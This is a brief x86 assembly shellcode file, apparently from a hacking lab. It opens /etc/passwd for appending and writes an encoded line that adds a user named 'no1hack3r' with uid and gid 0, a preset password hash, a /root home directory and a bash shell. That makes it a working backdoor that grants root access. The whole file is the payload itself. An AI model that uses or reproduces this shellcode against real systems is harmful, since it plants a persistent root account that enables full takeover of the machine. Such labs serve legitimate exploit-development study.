; shellcode lab @ hack4
; dash

BITS 32
global _start

_start:
xor eax, eax
xor ebx, ebx
xor ecx, ecx

mov eax, 5
push ebx
push    0x64777373
push    0x61702f63
push    0x74652f2f
mov ebx, esp
mov ecx, 0x401
int 0x80

; take filedescriptor
xor ebx, ebx
mov ebx, eax

; write(f_open, line, 24)
xor eax, eax
xor ecx, ecx
mov eax, 4

push    ecx
push byte 0x0a
push    0x68736162
push    0x2f6e6962
push    0x2f3a746f
push    0x6f722f3a
push    0x3a303a30
push    0x3a494e73
push    0x386b5a39
push    0x65736d48
push    0x42413a72
push    0x336b6361
push    0x68316f6e
mov     ecx, esp
mov edx, 45
int 0x80

;close maybe?? ah forget that :>

; exit(23)
mov eax, 1
mov ebx, 23
int 0x80

